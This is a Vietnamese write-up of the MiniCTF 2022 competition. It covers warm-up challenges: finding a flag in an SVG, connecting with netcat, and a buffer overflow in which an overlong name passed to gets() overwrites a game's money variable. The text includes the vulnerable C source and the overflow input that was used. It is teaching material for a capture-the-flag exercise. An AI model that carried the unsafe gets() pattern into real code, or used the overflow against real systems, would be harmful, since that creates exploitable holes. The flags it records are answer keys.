#MiniCTF 2022 Write-up

###Nội dung:
[1.Warm Up](#warmup)
   [1.1 Basic Forensics]()
   [1.2 What is Netcat]()
   [1.3 Abcbof]()
   [1.4 Rock, Paper, Scissors]()
[2.Web](#web)
   [2.1 PHP Moon Cake]()
   [2.2 Get out of here]()
   [2.3 Find Flag]()
   [2.4 keiichi]()
[3.Forensics]
   [3.1 Correct File?]()
   [3.2 Japanese Food]()
   [3.3 Where is Nemo?]()
   [3.4 Are you Wibu??]()
   [3.5 OnlyFan]()
[4.Cryptography]
   [4.1 Do you know what is basecrack]()
   [4.2 Love Song]()
   [4.3 Ceasar Knight]()
   [4.4 You are noob]()
   [4.5 ROTTOR]()
   [4.6 UwU]
[5.Reverse Engineering]
   [5.1 Baby Kinzx]()
   [5.2 EZ RE]()
   [5.3 Loop Key]()
   [5.4 XOR]()
[6.Misc]
   [6.1 Best Avatar]
   [6.2 Base64]
   [6.3 New Misc]
   
##1. Warm Up
###1.1 Basic Forensics
Đề bài cho chúng ta một file .svg. Đầu tiên hãy mở nó lên đã

![Circle](Warm_Up/Basic_Forensics/1.png)
Không có gì quá đặc biệt. Thử Inspect xem sao
![step2](Warm_Up/Basic_Forensics/2.png)
Ở trong block **<text>** ta có thể thấy được flag: ISPCTF{7hAt_warm_up_gnys}
	
###1.2 What is Netcat

Netcat là một phần mềm có thể đọc và viết dữ liệu thông qua giao thức TCP hoặc UDP chủ yếu được điều khiển bởi các phần mềm và scripts khác (Để biết thêm, tham khảo man nc)
	
Đề bài cho chúng ta một câu lệnh của netcat. Hãy thử nhập vào terminal xem sao
'''
$ nc 174.138.21.217 3136
	
                              NETCAT      
                            /\_____/\    
                           /  o   o  \   
                          ( ==  ^  == )   
                          ))         (    
                          (           )   
                         ( (  )   (  ) )  
                        (__(__)___(__)__) 
	

Here your flag: ISPCTF{Th1s_1s_n3t_c4t}
'''

###1.3 Abcbof
	
Vẫn là một câu lệnh netcat, nhập vào terminal thôi 
'''
$ nc 174.138.21.217 3137
	
Hãy nhập tên người chơi: writeup
==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================
| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Tài Khoản | 5. Thoát Game |
======================================================================================

Hello writeup, chào mừng bạn đến với Game Bài Uy Tín Top 1 Việt Nam !!!
Nhập lựa chọn của bạn: 
2
==============Hướng Dẫn==============
  Chiến thắng để dành giải thưởng   
      1 triệu $ từ Halston <3       
                                    
 Mỗi lần nhập hãy nhập vào một lá   
  mà giống với lá bài của nhà cái   
  Bộ bài chỉ gồm 9 lá từ 2 đến 10    
 Do lợi nhuận cao nên mọi người đến 
 chơi bài rất nhiều dẫn đến khi đi  
 về họ cầm theo cả Át, J, Q, K để   
 đi về. Mỗi lần đoán đúng sẽ được   
             50 000$                
                                    
               Hint                 
  Hãy cố gắng nhập THẬT NHIỀU để    
      có thể chiến thắng nhé.       
                     Kevin Halston  
=====================================


'''

Có vẻ như đây là một trò chơi, flag có trị giá 1 000 000 000$ mà mỗi lần thắng chỉ được có 50 000$. Nếu lần nào cũng thắng thì phải thắng 20 000. Oải ha. Thế chắc không chơi đúng luật được rồi. Đề bài còn cho kèm theo source code nữa kìa. Để xem có gì thú vị không.

'''
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>


void isp();
void huongDan();
void flag();
int main(){   
    long long money = 0;
    puts("==========================Game Bai Doan So Uy Tin Doi Thuong ==========================");
    puts("| 1. Choi Game   |  2. Huong Dan   |   3. Doi Flag   |  4. Thoat Game |  5. Tai Khoan |");
    puts("======================================================================================");
    puts("Hay nhap ten nguoi choi:");
    char name[30];
    gets(name);
    system("clear");
TieuDe:
    isp();
    puts("==========================Game Bai Doan So Uy Tin Doi Thuong==========================");
    puts("| 1. Choi Game   |  2. Huong Dan   |   3. Doi Flag   |  4. Tai Khoan | 5. Thoat Game |");
    puts("======================================================================================");
    puts("");
    printf("Hello %s, chao mung ban den voi Game Bai Uy Tin Top 1 Viet Nam !!!\n", name);
    int x;
    puts("Nhap lua chon cua ban:");
    scanf("%d", &x);
    fflush(stdin);
    switch(x){
        case 1:
            printf("\nTai khoan cua ban co %lld $\n", money);
            printf("Hello %s chao mung ban den voi cuoc choi song con\n", name);
            srand(time(NULL));
            puts("Hay nhap la bai ma ban doan");
            int card;
            scanf("%d", &card);
            int ran = rand() %  9 + 2;
            if(ran == card){
                money += 50000;
                puts("Chuc mung ban da kiem duoc 50 000 $");
                printf("\nQuay tro lai sau %d giay\n", ran);
                puts("Vui long doi trong giay lat");
                sleep(ran);
                system("clear");
                goto TieuDe;
            }
            else{
                puts("Ban da doan sai, vui long thu lai sau");
                sleep(1);
                system("clear");
                goto TieuDe;
            }
                   
        case 2:
            huongDan();
            puts("");
            puts("Quay tro lai sau 10 giay");
            sleep(10);
            system("clear");
            goto TieuDe;
        
        case 3:
            printf("\nTai khoan cua ban co %lld $ \n", money);
            puts("=====================FLAG=======================");
            puts("|Ban co muon mua FLAG voi gia 1 000 000 000 $  |");
            puts("|----------------------------------------------|");
            puts("|         1. YES      |         2. NO          |");
            puts("================================================");
            int x;
            puts("Lua chon cua ban : ");
            scanf("%d", &x);
            if(x == 1){
                if(money >= 1000000000){
                    printf("\n\nChuc mung ban da chien thang\n");
                    puts("Day la Flag cua ban:");
                    flag();
                    return 0;
                }
                else{
                    puts("Ban khong du tien hay doan bai de kiem them");
                    sleep(2);
                    system("clear");
                  goto TieuDe;
                }
            }
            else{
                puts("Ban da nhap sai cu phap, vui long thu lai sau");
                sleep(2);
                system("clear");
                goto TieuDe;
            }
        case 5:
            puts("Tam biet ban, hen gap lai lan sau");
            puts("       From ISP with love <3     ");
            return 0;
    
        case 4:
            printf("\nTai khoan cua ban co %lld $ \n", money);
            puts("Quay tro lai sau 3 giay");
            sleep(3);
            system("clear");
            goto TieuDe;

        default:
            puts("Ban da nhap sai vui long nhap lai sau 3 giay");
            sleep(3);
            system("clear");
            goto TieuDe;     
    }
    return 0;
}
...
'''
Còn dài nữa nhưng chúng ta chỉ cần quan tâm phần đầu thôi. Cụ thể là đoạn này
'''
long long money = 0;
puts("==========================Game Bai Doan So Uy Tin Doi Thuong ==========================");
puts("| 1. Choi Game   |  2. Huong Dan   |   3. Doi Flag   |  4. Thoat Game |  5. Tai Khoan |");
puts("======================================================================================");
puts("Hay nhap ten nguoi choi:");
char name[30];
gets(name);
system("clear");
'''
Ta có thể thấy biến 'name' là một char array có 30 phần tử. Vậy điều gì sẽ xảy ra nếu chúng ta nhập một chuỗi dài hơn 30 ký tự? Nó sẽ bị tràn, và tràn ra biến trước đó, là 'long long money = 0'. Bằng cách này ta có thể hack tiền. Thử ha
				
'''
Hãy nhập tên người chơi: 1111111111111111111111111111111111111111111111111111111111111
==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================
| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Tài Khoản | 5. Thoát Game |
======================================================================================

Hello 1111111111111111111111111111111111111111111111111111111111111, chào mừng bạn đến với Game Bài Uy Tín Top 1 Việt Nam !!!
Nhập lựa chọn của bạn:
3

Tài khoản của bạn có 3544668469065756977 $ 
=====================FLAG=======================
|Bạn có muốn mua FLAG với giá 1 000 000 000 $  |
|----------------------------------------------|
|         1. YES      |         2. NO          |
================================================
Lựa chọn của bạn : 
1


Chúc mừng bạn đã chiến thắng
Đây là Flag của bạn:
ISPCTF{B4s1c_Buff3r_0v3rFl0w}

'''


